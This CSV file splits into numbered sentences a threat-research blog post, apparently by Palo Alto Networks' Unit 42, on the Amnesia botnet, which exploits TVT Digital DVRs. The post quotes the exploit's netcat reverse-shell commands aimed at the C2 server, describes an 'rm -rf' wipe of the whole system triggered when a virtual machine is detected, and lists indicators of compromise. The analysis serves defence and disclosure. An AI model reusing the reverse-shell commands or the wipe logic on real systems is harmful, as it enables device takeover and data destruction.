Number,Content
"""Sentence 1","new iot/linux malware targets dvrs, forms botnet
60,454
people reacted
5
7 min."
"""Sentence 2","read
share 
by claud xiao and cong zheng

april 6, 2017 at 1:00 pm

category: malware, unit 42

tags: amnesia, botnet, dvr, iot, linux, tsunami

this post is also available in: 日本語 (japanese)

unit 42 researchers have identified a new variant of the iot/linux botnet “tsunami”, which we are calling “amnesia”."
"""Sentence 3",the amnesia botnet targets an unpatched remote code execution vulnerability that was publicly disclosed over a year ago in march 2016 in dvr (digital video recorder) devices made by tvt digital and branded by over 70 vendors worldwide (a listing of which can be found on the original vulnerability report we've linked to).
"""Sentence 4","based on our scan data shown below in figure 1, this vulnerability affects approximately 227,000 devices around the world with taiwan, the united states, israel, turkey, and india being the most exposed."
"""Sentence 5","amnesia_1

figure 1  distribution of vulnerable tvt digital's dvr devices


in addition, we believe the amnesia malware is the first linux malware to adopt virtual machine evasion techniques to defeat malware analysis sandboxes."
"""Sentence 6",virtual machine evasion techniques are more commonly associated with microsoft windows and google android malware.
"""Sentence 7","similar to those, amnesia tries to detect whether it’s running in a virtualbox, vmware or qemu based virtual machine, and if it detects those environments it will wipe the virtualized linux system by deleting all the files in file system."
"""Sentence 8",this affects not only linux malware analysis sandboxes but also some qemu based linux servers on vps or on public cloud.
"""Sentence 9","amnesia exploits this remote code execution vulnerability by scanning for, locating, and attacking vulnerable systems."
"""Sentence 10",a successful attack results in amnesia gaining full control of the device.
"""Sentence 11","attackers could potentially harness the amnesia botnet to launch broad ddos attacks similar to the mirai botnet attacks we saw in fall 2016.

even though this vulnerability was disclosed over a year ago, despite our best efforts, we have been unable to find updates that fix this vulnerability."
"""Sentence 12","while the amnesia botnet hasn’t yet been used to mount large scale attacks, the mirai botnet attacks show the potential harm large-scale iot-based botnets can cause."
"""Sentence 13",palo alto networks recommends all customers ensure they have our latest protections in place.
"""Sentence 14","additionally, everyone should block traffic to amnesia’s command and control servers (c2s) listed in indicators of compromise (ioc) section of this blog should do so."
"""Sentence 15","technical details
vulnerability details

on march 22, 2016, security researcher rotem kerner disclosed the vulnerability to the public."
"""Sentence 16","according to his blog, over 70 dvr vendors around the world were affected by the vulnerability."
"""Sentence 17","however, all the dvr devices were manufactured by the same company, “tvt digital”."
"""Sentence 18","to date, we have been unable to find any patch released by the vendors or the manufacturer to address the vulnerability."
"""Sentence 19","additionally, by using the fingerprint of “cross web server”, we discovered over 227,000 devices exposed on internet that are likely produced by tvt digital."
"""Sentence 20",we also searched the keyword on shodan.io and on censys.io.
"""Sentence 21","they reported about 50,000 and about 705,000 ip addresses respectively."
"""Sentence 22","table 1 shows the top 20 countries for potentially vulnerable tvt digital dvr devices:

1.	taiwan	47170
2.	united states	44179
3.	israel	23355
4.	turkey	11780
5.	india	9796
6.	malaysia	9178
7.	mexico	7868
8.	italy	7439
9.	vietnam	6736
10.	united kingdom	4402
11.	russia	3571
12.	hungary	3529
13.	france	3165
14.	bulgaria	3040
15.	romania	2783
16.	colombia	2616
17.	egypt	2541
18.	canada	2491
19.	iran	1965
20.	argentina	1748
table 1 top 20 countries for potentially vulnerable tvt dvr digital devices

propagation and vulnerability exploitation

amnesia communicates with its c2 server using the irc protocol."
"""Sentence 23","figure 2 shows some commands it was designed to receive, including to launch ddos attacks by different types of http flooding and udp flooding."
"""Sentence 24","amnesia_2

figure 2  c2 commands of amnesia

in addition to these commands, two more commands were implemented: cctvscanner and cctvprocs."
"""Sentence 25",these commands are used for scanning and exploiting the rce vulnerability in tvt digital dvrs.
"""Sentence 26","after receiving the commands, amnesia will firstly make a simple http request to the ip address included with the command, checking whether the target is a vulnerable dvr device."
"""Sentence 27",this is done by searching for a special string “cross web server” in the http response content as shown in figure 3 since the tvt digital’s dvrs used this string as server name in http header.
"""Sentence 28","amnesia_3

figure 3  check whether the target is a vulnerable dvr

if a vulnerable dvr is found, amnesia will send four more http requests which contains exploit payloads of four different shell commands."
"""Sentence 29","the commands are:

echo nc > f
echo {one_of_c2_domains} >> f
echo 8888 –e $shell >> f
$(cat f) & > r
these commands create a shell script file and execute it."
"""Sentence 30",the script content connects with one of amnesia c2 servers and to expose system default shell.
"""Sentence 31","therefore, the infected devices will be compromised and will listen further shell commands sent from c2 servers as shown in figure 4

amnesia_4

figure 4  exploit the rce vulnerability

anti-forensics

when an amnesia sample executes, it will immediately check whether it’s running in a virtual machine by reading files /sys/class/dmi/id/product_name and /sys/class/dmi/id/sys_vendor and comparing the file contents with keywords “virtualbox”, “vmware” and “qemu” as shown in figure 5. these two files are used by linux dmi (desktop management interface) to store hardware’s product and manufacturer information."
"""Sentence 32","these strings being included in the dmi files implies that the linux system is running in a virtual machine based on virtualbox, vmware or qemu, respectively."
"""Sentence 33","amnesia_5

figure 5  inspects dmi files to detect vm

if a virtual machine was detected, amnesia will delete itself, and then try to delete all of the following directories:

the linux root directory “/”,
the current user’s home directory “~/”, and
the current working directory “./”
these delete operations are basically equivalent to wiping the whole linux system."
"""Sentence 34","they were implemented by simply executing shell command “rm -rf” as shown in figure 6. for each directory, “rm” command will be executed twice – one in the background, and one in the foreground."
"""Sentence 35","hence, the deleting of the three directories will be parallel."
"""Sentence 36","finally, amnesia will wait for the delete to finish."
"""Sentence 37","amnesia_6

figure 6  wipe the linux system

we believe the author of amnesia was aiming to defeat linux-based malware analysis sandboxes and to cause trouble for security researchers due to a hard-coded but otherwise useless string in the code: “fxxkwhitehats”."
"""Sentence 38","however, vm based sandboxes typically have system snapshot enabled, allowing for quick recovery to the original state (the sample’s analysis task may be ruined though)."
"""Sentence 39",the impact will be limited in these cases.
"""Sentence 40","the real problem is, if the malware infected some qemu based linux server instances, such as virtual hosts provided by vps vendors, the linux server will also be wiped, which could be catastrophic if back-ups are not available."
"""Sentence 41","after the vm check, amnesia creates persistence files in /etc/init.d/.rebootime and /etc/cron.daily/.reboottime, or in ~/.bashrc and ~/.bash_history, depending on the current user’s privileges."
"""Sentence 42","it then kills all telnet and ssh related processes, and connects with a c2 server to receive further commands."
"""Sentence 43",amnesia hard-coded three domain names such as “irc.freenode.net” as decoy c2 server addresses.
"""Sentence 44","however, the real c2 configuration is decrypted during runtime by simple caesar cipher algorithm."
"""Sentence 45","it chooses one of these three servers:

ukranianhorseriding[."
"""Sentence 46","]net
surrealzxc.co[."
"""Sentence 47","]za
inversefierceapplied[."
"""Sentence 48","]pw
all three of these domains have resolved to the same ip address 93.174.95[."
"""Sentence 49","]38 since december 1st, 2016. before that, the ip address was also used to host other iot/linux malware such as dropperl."
"""Sentence 50","conclusion
besides the threat that the amnesia botnet presents, the malware reveals some interesting and notable trends of current iot/linux botnet threats:

iot/linux malware has begun to adopt classic techniques to evade and even wipe virtual machines."
"""Sentence 51",iot/linux malware targets and attacks known remote code execution vulnerabilities in iot devices.
"""Sentence 52",these are typically manufactured by smaller manufacturers and there may be no patch available.
"""Sentence 53",iot/linux malware may also affect linux servers deployed in vps or in public cloud.
"""Sentence 54","in the case of amnesia, because the malware relies on hard coded c2 addresses, preventing another mirai-type attack is possible if these addresses are blocked as broadly as possible as quickly as possible."
"""Sentence 55","update: after publishing this report, we learned of other researchers’ past work on various aspects of this malware."
"""Sentence 56","as we mentioned in the introduction, the tsunami bot has a long history, and this latest version incorporated new features, including a scanner to identify and exploit dvrs for cctv systems as well as anti-vm detection capabilities."
"""Sentence 57",the cctv scanning and exploitation technique was previously discussed in these two reports.
"""Sentence 58","8ack - big brother is attacking you
cyberx – radiation report
researcher michal malik also noted this malware had vm detection capabilities in a tweet in january: https://twitter.com/michalmalik/status/818182119285473282

protections
palo alto networks has blocked the domains used by this malware for command and control through pan-db and threat prevention."
"""Sentence 59","indicators of compromise
c2 domains and ip addresses

ukranianhorseriding[."
"""Sentence 60","]net
surrealzxc.co[."
"""Sentence 61","]za
inversefierceapplied[."
"""Sentence 62","]pw
93.174.95[."
"""Sentence 63","]38
amnesia sample sha-256

06d30ba7c96dcaa87ac584c59748708205e813a4dffa7568c1befa52ae5f0374

10aa7b3863f34d340f960b89e64319186b6ffb5d2f86bf0da3f05e7dbc5d9653

175fe89bbc8e44d45f4d86e0d96288e1e868524efa260ff07cb63194d04ea575

1d8bc81acbba0fc56605f60f5a47743491d48dab43b97a40d4a7f6c21caca12a

2f9cd1d07c535aae41d5eed1f8851855b95b5b38fb6fe139b5f1ce43ed22df22

327f24121d25ca818cf8414c1cc704c3004ae63a65a9128e283d64be03cdd42e

37b2b33a8e344efcaca0abe56c6163ae64026ccef65278b232a9170ada1972af

3a595e7cc8e32071781e36bbbb680d8578ea307404ec07e3a78a030574da8f96

4313af898c5e15a68616f8c40e8c7408f39e0996a9e4cc3e22e27e7aeb2f8d54

46ea20e3cf34d1d4cdfd797632c47396d9bdc568a75d550d208b91caa7d43a9b

4b0feb1dd459ade96297b361c69690ff69e97ca6ee5710c3dc6a030261ba69e0

4db9924decd3e578a6b7ed7476e499f8ed792202499b360204d6f5b807f881b8

5e6896b39c57d9609dc1285929b746b06e070886809692a4ac37f9e1b53b250c

64f03fff3ed6206337332a05ab9a84282f85a105432a3792e20711b920124707

6b2885a4f8c9d84e5dc49830abf7b1edbf1b458d8b9d2bafb680370106f93bc3

6b29b65c3886b6734df788cfc6628fbee4ce8921e3c0e8fc017e4dea2da0fd0b

885dce73237c4d7b4d481460baffbd5694ab671197e8c285d53b551f893d6c09

886136558ec806da5e70369ee22631bfb7fa06c27d16c987b6f6680423bc84b0

8f57ec9dfba8cf181a723a6ac2f5a7f50b4550dd33a34637cf0f302c43fd0243

9351ee0364bdbb5b2ff7825699e1b1ee319b600ea0726fd9bb56d0bd6c6670cb

9c7a5239601a361b67b1aa3f19b462fd894402846f635550a1d63bee75eab0a2

a010bf82e2c32cba896e04ec8dbff58e32eee9391f6986ab22c612165dad36a0

ad65c9937a376d9a53168e197d142eb27f04409432c387920c2ecfd7a0b941c8

aeb480cf01696b7563580b77605558f9474c34d323b05e5e47bf43ff16b67d6a

b113ec41cc2fd9be9ac712410b9fd3854d7d5ad2dcaac33af2701102382d5815

b13014435108b34bb7cbcef75c4ef00429b440a2adf22976c31a1645af531252

b3d0d0e2144bd1ddd27843ef65a2fce382f6d590a8fee286fda49f8074711545

bdefa773e3f09cdc409f03a09a3982f917a0cc656b306f0ece3dd1a2564a8772

c03b403d5de9778a2ec5949d869281f13976c2fc5b071e0f5f54277680c80902

cb2382b818993ef6b8c738618cc74a39ecab243302e13fdddb02943d5ba79483

ce61dcfc3419ddef25e61b6d30da643a1213aa725d579221f7c2edef40ca2db3

d0bda184dfa31018fe999dfd9e1f99ca0ef502296c2cccf454dde30e5d3a9df9

e7d6b3e1fba8cdf2f490031e8eb24cd515a30808cdd4aa15c2a41aa0016f8082

eb54dc959b3cc03fbd285cef9300c3cd2b7fe86b4adeb5ca7b098f90abb55b8a

f23fecbb7386a2aa096819d857a48b853095a86c011d454da1fb8e862f2b4583

f6af2fa4f987df773d37d9bb44841a720817ce3817dbf1e983650b5af9295a16

f7a737cb73802d54f7758afe4f9d0a7d2ea7fda4240904c0a79abae732605729

f7cf1e0d7756d1874630d0d697c3b0f3df0632500cff1845b6308b11059deb07

f97848514b63e9d655a5d554e62f9e102eb477c5767638eeec9efd5c6ad443d8"
